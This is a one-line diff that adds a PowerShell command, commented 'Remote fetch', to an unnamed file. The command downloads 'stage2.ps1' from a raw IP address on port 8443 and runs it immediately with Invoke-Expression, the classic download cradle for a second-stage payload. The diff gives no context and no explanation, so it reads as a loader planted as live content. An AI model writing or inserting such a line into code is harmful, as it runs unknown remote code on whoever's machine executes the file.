@@ -1,0 +1,1 @@
+<# Remote fetch #> $TransferUrl = "https://203.0.113.229:8443/stage2.ps1"; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($TransferUrl); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
